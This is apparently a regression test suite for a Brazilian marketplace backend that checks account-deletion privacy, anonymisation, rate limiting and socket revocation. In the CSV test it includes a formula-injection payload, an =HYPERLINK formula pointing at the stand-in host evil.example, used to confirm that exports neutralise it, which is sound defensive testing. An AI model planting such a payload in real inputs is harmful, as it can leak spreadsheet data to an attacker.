import { randomUUID } from 'node:crypto';
import { eq } from 'drizzle-orm';
import { io, type Socket } from 'socket.io-client';
import { PARAMETER_BY_KEY } from '../src/modules/admin/parameters.definitions.js';
import { RateLimitService } from '../src/platform/ratelimit/rate-limit.service.js';
import { AccountDeletionService } from '../src/modules/privacy/account-deletion.service.js';
import { accountDeletions, auditLog, consents, contentReports, exchangeEvents, exchangeRequests, orderEvents, orderItems, orders, paymentAlerts, privacyRequestEvents, privacyRequests, reviews, termsAcceptances, users } from '../src/platform/database/schema.js';
import { bearer, createTestApp, STRONG_PASSWORD, type TestContext } from './helpers/app.js';
import { useParam } from './helpers/fees.js';
import { createAdmin, createCustomer, ensureCity, ensureLegalDocs, registerUser, verifyEmailOf } from './helpers/fixtures.js';
import { addToCart, approve, attemptOf, placeOrder, shopWith } from './helpers/orders.js';

/**
 * S6.2 (DEC-050): os ataques A1 a A6 da revisão `docs/seguranca/revisao-onda6.md` (A3 está em `sec155-first-purchase`) viram testes do
 * repositório. SEC-152, 153, 154, 156, 157, 158, 159 e 160.
 */
/** Leitor mínimo de CSV (RFC 4180, separador `;`): devolve todas as células, na ordem. */
function parseCsv(text: string): string[] {
  const cells: string[] = [];
  let cell = '';
  let quoted = false;
  for (let i = 0; i < text.length; i += 1) {
    const ch = text[i]!;
    if (quoted) {
      if (ch === '"' && text[i + 1] === '"') {
        cell += '"';
        i += 1;
      } else if (ch === '"') quoted = false;
      else cell += ch;
    } else if (ch === '"') quoted = true;
    else if (ch === ';' || ch === '\n') {
      cells.push(cell.replace(/\r$/, ''));
      cell = '';
    } else cell += ch;
  }
  cells.push(cell);
  return cells;
}

describe('Privacidade e segurança da Onda 6 (SEC-152 a 160)', () => {
  let ctx: TestContext;
  let service: AccountDeletionService;
  let url: string;
  const sockets: Socket[] = [];
  beforeAll(async () => {
    ctx = await createTestApp();
    await ctx.app.listen(0, '127.0.0.1');
    url = `${await ctx.app.getUrl()}/rt`;
    await ensureLegalDocs(ctx);
    await ensureCity(ctx, 'Francisco Morato');
    service = ctx.app.get(AccountDeletionService);
  });
  afterAll(async () => {
    sockets.forEach((s) => s.close());
    await ctx.close();
  });

  const ipOf = () => `10.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}.${1 + Math.floor(Math.random() * 250)}`;
  const web = (path: string, body: Record<string, unknown>, ip = ipOf()) => ctx.http.post(`/v1/auth/account-deletion/${path}`).set('X-Forwarded-For', ip).send(body);
  const del = (token: string, password: string) => ctx.http.post('/v1/me/deletion').set(bearer(token)).send({ password });

  it('A1 / SEC-152: dois pedidos de código em sequência dão a MESMA resposta para conta confirmada e para e-mail inexistente', async () => {
    const confirmed = await createCustomer(ctx);
    const ghost = `fantasma-${randomUUID().slice(0, 8)}@teste.webag.local`;
    const seq = async (email: string) => {
      const out: number[] = [];
      const ip = ipOf();
      for (let i = 0; i < 2; i += 1) out.push((await web('start', { email }, ip)).status);
      return out;
    };
    const real = await seq(confirmed.email);
    const fake = await seq(ghost);
    expect(real).toEqual(fake);
    expect(real).toEqual([200, 429]);
  });

  it('A2 / SEC-153: com o step-up da conta ativo, a senha certa na via B NÃO emite ticket; as falhas da via B somam no contador da conta', async () => {
    const victim = await createCustomer(ctx);
    // 20 falhas de login (de IPs diferentes) ligam o step-up da conta; a via B é limitada a 5 por e-mail/hora, então o resto vem do login.
    for (let i = 0; i < 20; i += 1) await ctx.http.post('/v1/auth/login').set('X-Forwarded-For', ipOf()).send({ email: victim.email, password: 'errada-errada-1' }).expect(401);
    const login = await ctx.http.post('/v1/auth/login').set('X-Forwarded-For', ipOf()).send({ email: victim.email, password: victim.password });
    expect(login.status).toBe(403);
    expect(login.body.code).toBe('LOGIN_CODE_REQUIRED');

    const attempt = await web('start', { email: victim.email, password: victim.password });
    expect(attempt.status).toBe(403);
    expect(attempt.body.code).toBe('LOGIN_CODE_REQUIRED');
    expect(attempt.body.deleteTicket).toBeUndefined();
    expect((await ctx.db.select({ status: users.status }).from(users).where(eq(users.id, victim.userId)))[0]!.status).toBe('active');

    // As falhas pela via B também somam no contador por conta (`lfa`), de qualquer IP.
    const other = await createCustomer(ctx);
    for (let i = 0; i < 3; i += 1) await web('start', { email: other.email, password: 'errada-errada-1' }, ipOf()).expect(401);
    expect((await ctx.app.get(RateLimitService).peek(`lfa:${other.userId}`)).count).toBe(3);

    // E-mail não confirmado sob ataque: a mesma resposta genérica da senha errada.
    const unconfirmed = await registerUser(ctx);
    for (let i = 0; i < 20; i += 1) await ctx.http.post('/v1/auth/login').set('X-Forwarded-For', ipOf()).send({ email: unconfirmed.email, password: 'errada-errada-1' }).expect(401);
    const generic = await web('start', { email: unconfirmed.email, password: unconfirmed.password });
    expect(generic.status).toBe(401);
    expect(generic.body.deleteTicket).toBeUndefined();
  });

  it('SEC-154: o padrão do arrependimento é 72 h e a exclusão fica pendente (login bloqueado, aviso por e-mail, arrependimento devolve a conta)', async () => {
    expect(PARAMETER_BY_KEY.get('exclusao_arrependimento_horas')).toMatchObject({ default: 72 });
    await useParam(ctx, 'exclusao_arrependimento_horas', 72);
    try {
      const user = await createCustomer(ctx);
      ctx.mail.outbox.length = 0;
      const outcome = (await del(user.accessToken, STRONG_PASSWORD).expect(200)).body;
      expect(outcome.status).toBe('pending');
      expect(new Date(outcome.cancelableUntil).getTime()).toBeGreaterThan(Date.now() + 71 * 3_600_000);
      expect(ctx.mail.to(user.email).length).toBeGreaterThanOrEqual(1);
      await ctx.http.get('/v1/me').set(bearer(user.accessToken)).expect(401);
      await ctx.http.post('/v1/auth/login').send({ email: user.email, password: user.password }).expect(403);
      await ctx.http.post('/v1/auth/account-deletion/cancel').set('X-Forwarded-For', ipOf()).send({ email: user.email, password: user.password }).expect(204);
      await ctx.http.post('/v1/auth/login').send({ email: user.email, password: user.password }).expect(200);
    } finally {
      await useParam(ctx, 'exclusao_arrependimento_horas', 0);
    }
  });

  it('A4 / SEC-156: motivo de cancelamento com quebra de linha e fórmula não vira linha de planilha em nenhum CSV', async () => {
    const shop = await shopWith(ctx, [{ name: 'Item', priceCents: 4_000, stock: 20 }]);
    const user = await createCustomer(ctx);
    const addr = (await ctx.http.post('/v1/me/addresses').set(bearer(user.accessToken)).send({ cep: '07900-100', street: 'Rua CSV', number: '1', neighborhood: 'Centro', city: 'Francisco Morato', state: 'SP', lat: shop.origin.lat, lng: shop.origin.lng }).expect(201)).body.id as string;
    await addToCart(ctx, user, shop.variants[0]!, 1).expect(200);
    const created = (await placeOrder(ctx, user, addr)).body as { id: string };
    await approve(ctx, user, (await attemptOf(ctx, created.id)).id);
    const payload = 'mudei de ideia\n=HYPERLINK("https://evil.example/?x="&A1;"clique")';
    await ctx.http.post(`/v1/orders/${created.id}/cancel`).set(bearer(user.accessToken)).send({ reason: payload }).expect(200);

    const finance = await createAdmin(ctx, 'finance');
    const day = new Date().toISOString().slice(0, 10);
    const params = { from: day, to: day };
    for (const path of ['/v1/admin/reports/orders.csv', '/v1/admin/reports/operations.csv']) {
      const res = await ctx.http.get(path).query(params).set(bearer(finance.accessToken));
      expect(res.status, `${path}: ${res.text.slice(0, 200)}`).toBe(200);
      // Lê o CSV como a planilha lê (aspas, `;` e quebras de linha dentro de célula): nenhuma CÉLULA pode começar com fórmula.
      const cells = parseCsv(res.text.replace(/^\uFEFF/, ''));
      expect(cells.filter((c) => /^[=+@\t\r]/.test(c) || /^-[^\d,.]/.test(c)), path).toEqual([]);
      const reason = cells.find((c) => c.includes('mudei de ideia'));
      expect(reason, `${path}: o motivo precisa ficar numa só célula`).toContain('=HYPERLINK');
    }
  });

  it('A5 / SEC-157: exclusão e reset de senha derrubam o socket em até 2 s', async () => {
    const connect = async (token: string) => {
      const socket = io(url, { auth: { token }, transports: ['websocket'], reconnection: false, forceNew: true });
      sockets.push(socket);
      await new Promise<void>((resolve, reject) => {
        socket.once('connect', () => resolve());
        socket.once('connect_error', reject);
      });
      return socket;
    };
    const dropped = (socket: Socket, ms: number) =>
      new Promise<boolean>((resolve) => {
        if (socket.disconnected) return resolve(true);
        const timer = setTimeout(() => resolve(false), ms);
        socket.once('disconnect', () => {
          clearTimeout(timer);
          resolve(true);
        });
      });

    const leaving = await createCustomer(ctx);
    const socketA = await connect(leaving.accessToken);
    expect(socketA.connected).toBe(true);
    await del(leaving.accessToken, STRONG_PASSWORD).expect(200);
    expect(await dropped(socketA, 2_000)).toBe(true);

    const resetting = await createCustomer(ctx);
    const socketB = await connect(resetting.accessToken);
    await ctx.http.post('/v1/auth/password/forgot').set('X-Forwarded-For', ipOf()).send({ email: resetting.email }).expect(202);
    const code = ctx.mail.lastCode(resetting.email);
    await ctx.http.post('/v1/auth/password/reset').set('X-Forwarded-For', ipOf()).send({ email: resetting.email, code, newPassword: 'Nova-Senha-Forte-77' }).expect(200);
    expect(await dropped(socketB, 2_000)).toBe(true);
  });

  it('A6 / SEC-158 e SEC-159: a anonimização apaga TODO texto livre do titular e trunca o IP dos aceites (/24)', async () => {
    const shop = await shopWith(ctx, [{ name: 'Camiseta', priceCents: 8_000, stock: 20 }]);
    const tag = `Tag${randomUUID().slice(0, 8)}`;
    const user = await registerUser(ctx, { name: `Marilda ${tag}`, phone: `(11) 9${String(Math.floor(Math.random() * 1e8)).padStart(8, '0')}` });
    await verifyEmailOf(ctx, user);
    const phone = (await ctx.db.select({ phone: users.phone }).from(users).where(eq(users.id, user.userId)))[0]!.phone!;
    const addr = (await ctx.http.post('/v1/me/addresses').set(bearer(user.accessToken)).send({ cep: '07900-100', street: `Rua ${tag}`, number: '10', neighborhood: 'Centro', city: 'Francisco Morato', state: 'SP', lat: shop.origin.lat, lng: shop.origin.lng }).expect(201)).body.id as string;

    // 1) pedido cancelado com motivo livre (orders.cancel_reason e order_events.reason)
    await addToCart(ctx, user, shop.variants[0]!, 1).expect(200);
    const first = (await placeOrder(ctx, user, addr)).body as { id: string };
    await approve(ctx, user, (await attemptOf(ctx, first.id)).id);
    await ctx.http.post(`/v1/orders/${first.id}/cancel`).set(bearer(user.accessToken)).send({ reason: `Sou Marilda ${tag} ${phone}` }).expect(200);
    // 2) pedido entregue (o fiscal fica)
    await addToCart(ctx, user, shop.variants[0]!, 1).expect(200);
    const second = (await placeOrder(ctx, user, addr)).body as { id: string };
    await approve(ctx, user, (await attemptOf(ctx, second.id)).id);
    await ctx.db.update(orders).set({ status: 'delivered', deliveredAt: new Date() }).where(eq(orders.id, second.id));
    // 3) denúncia com texto, resposta da loja à avaliação, evento de troca e pedido de titular respondido
    await ctx.db.insert(reviews).values({ storeId: shop.store.id, userId: user.userId, rating: 4, comment: `Falo eu, ${tag}`, storeReply: `Obrigado, Marilda ${tag}!` });
    const target = (await ctx.db.select({ id: reviews.id }).from(reviews).where(eq(reviews.userId, user.userId)))[0]!.id;
    await ctx.db.insert(contentReports).values({ targetType: 'review', targetId: target, reporterId: user.userId, reason: 'offensive', text: `denúncia de ${tag} ${phone}` });
    const [item] = await ctx.db.select({ id: orderItems.id }).from(orderItems).where(eq(orderItems.orderId, second.id));
    const [exchange] = await ctx.db.insert(exchangeRequests).values({ orderId: second.id, orderItemId: item!.id, method: 'drop_at_store', resolution: 'refund', quantity: 1, windowEndsAt: new Date(Date.now() + 86_400_000), storeId: shop.store.id, userId: user.userId, number: `T${tag.slice(3, 8)}`, type: 'withdrawal', status: 'cancelled', answerDeadlineAt: new Date(), description: `troca de ${tag}` } as never).returning({ id: exchangeRequests.id });
    await ctx.db.insert(exchangeEvents).values({ exchangeId: exchange!.id, fromStatus: 'requested', toStatus: 'cancelled', actor: 'customer', actorUserId: user.userId, reason: `desisti ${tag}` });
    const [dsr] = await ctx.db.insert(privacyRequests).values({ protocol: `PV-${tag.slice(3, 9)}`, type: 'access', channel: 'app', userId: user.userId, requesterEmail: user.email, message: `quero meus dados ${tag}`, dueAt: new Date(Date.now() + 86_400_000), answer: `Respondido a Marilda ${tag}` } as never).returning({ id: privacyRequests.id });
    await ctx.db.insert(privacyRequestEvents).values({ requestId: dsr!.id, action: 'answered', note: `Enviado a ${tag}` });
    // 4) IP dos aceites (veio do cadastro): o esperado depois é o /24
    const before = (await ctx.db.select({ ip: termsAcceptances.ip }).from(termsAcceptances).where(eq(termsAcceptances.userId, user.userId))).map((r) => r.ip);
    expect(before.some((ip) => ip !== null && /^\d+\.\d+\.\d+\.\d+$/.test(ip))).toBe(true);
    await ctx.http.put('/v1/me/consents/marketing_push').set(bearer(user.accessToken)).send({ granted: true }).expect(200);
    const truncated = (ip: string | null) => (ip === null ? null : ip.replace(/\.\d+$/, '.0'));

    await del(user.accessToken, STRONG_PASSWORD).expect(200);

    const needles = [user.email, phone, `Marilda ${tag}`, tag];
    const tables = (await ctx.pool.query<{ table_name: string }>(`select table_name from information_schema.tables where table_schema = 'public' and table_type = 'BASE TABLE'`)).rows.map((r) => r.table_name);
    const leaks: string[] = [];
    for (const table of tables) {
      if (table === 'access_log') continue; // exceção documentada: Marco Civil art. 15 (6 meses)
      for (const needle of needles) {
        const found = await ctx.pool.query(`select 1 from "${table}" t where t::text ilike $1 limit 1`, [`%${needle}%`]);
        if (found.rowCount) leaks.push(`${table}:${needle}`);
      }
    }
    expect(leaks, `dado pessoal restante: ${leaks.join(', ')}`).toEqual([]);
    expect((await ctx.db.select().from(orderEvents).where(eq(orderEvents.orderId, first.id))).every((e) => e.actor !== 'customer' || e.reason === null)).toBe(true);

    // SEC-159: IP truncado /24 (não apagado), prova do aceite mantida; trigger só admite o truncamento.
    const accepted = await ctx.db.select().from(termsAcceptances).where(eq(termsAcceptances.userId, user.userId));
    expect(accepted.length).toBeGreaterThan(0);
    expect(accepted.map((r) => r.ip).sort()).toEqual(before.map(truncated).sort());
    await expect(ctx.pool.query(`update terms_acceptances set ip = '1.2.3.4' where user_id = $1`, [user.userId])).rejects.toThrow(/append-only/); // outro IP que não o truncamento: negado
    await expect(ctx.pool.query(`update terms_acceptances set accepted_at = now() where user_id = $1`, [user.userId])).rejects.toThrow(/append-only/);
    await expect(ctx.pool.query(`delete from consents where user_id = $1`, [user.userId])).rejects.toThrow(/append-only/);
    expect((await ctx.db.select().from(consents).where(eq(consents.userId, user.userId))).length).toBeGreaterThan(0);
    // audit_log do próprio titular sem IP nem aparelho
    const trail = await ctx.db.select().from(auditLog).where(eq(auditLog.actorId, user.userId));
    expect(trail.some((r) => r.action === 'account.deletion_requested')).toBe(true);
    for (const row of trail.filter((r) => r.actorRole === 'customer')) expect({ ip: row.ip, userAgent: row.userAgent }).toEqual({ ip: null, userAgent: null });
  });

  it('SEC-160: falha repetida da anonimização e prazo da LGPD quase estourando geram alerta, uma vez por exclusão', async () => {
    await useParam(ctx, 'exclusao_arrependimento_horas', 24);
    try {
      const failing = await createCustomer(ctx);
      await del(failing.accessToken, STRONG_PASSWORD).expect(200);
      const [row] = await ctx.db.select().from(accountDeletions).where(eq(accountDeletions.userId, failing.userId));
      await ctx.db.update(accountDeletions).set({ effectiveAt: new Date(Date.now() - 1000) }).where(eq(accountDeletions.id, row!.id));
      // O storage falha a cada tentativa: a exclusão fica pendente e a falha é contada.
      const storage = (service as unknown as { storage: { deleteObject: (...a: unknown[]) => Promise<void> } }).storage;
      const original = storage.deleteObject.bind(storage);
      const { mediaAssets } = await import('../src/platform/database/schema.js');
      await ctx.db.insert(mediaAssets).values({ ownerUserId: failing.userId, purpose: 'exchange_photo', status: 'ready', objectKey: `exchange/${randomUUID()}.jpg`, declaredContentType: 'image/jpeg', declaredSizeBytes: 4, expiresAt: new Date(Date.now() + 1e6) });
      storage.deleteObject = () => Promise.reject(new Error('storage fora do ar'));
      try {
        for (let i = 0; i < 3; i += 1) expect(await service.processDue()).toMatchObject({ failed: 1 });
      } finally {
        storage.deleteObject = original;
      }
      const alertsOf = async (kind: string, id: string) => (await ctx.db.select().from(paymentAlerts).where(eq(paymentAlerts.kind, kind))).filter((a) => (a.details as { deletionId?: string }).deletionId === id);
      expect(await alertsOf('account_deletion_failed', row!.id)).toHaveLength(1);
      await service.processDue();
      expect(await alertsOf('account_deletion_failed', row!.id)).toHaveLength(1); // não repete

      // Pendente perto do teto de 15 dias (a 2 dias): alerta de prazo, uma vez.
      const stuck = await createCustomer(ctx);
      await del(stuck.accessToken, STRONG_PASSWORD).expect(200);
      const [stuckRow] = await ctx.db.select().from(accountDeletions).where(eq(accountDeletions.userId, stuck.userId));
      await ctx.db.update(accountDeletions).set({ requestedAt: new Date(Date.now() - 14 * 86_400_000) }).where(eq(accountDeletions.id, stuckRow!.id));
      await service.processDue();
      await service.processDue();
      expect(await alertsOf('account_deletion_overdue', stuckRow!.id)).toHaveLength(1);
    } finally {
      await useParam(ctx, 'exclusao_arrependimento_horas', 0);
    }
  });
});
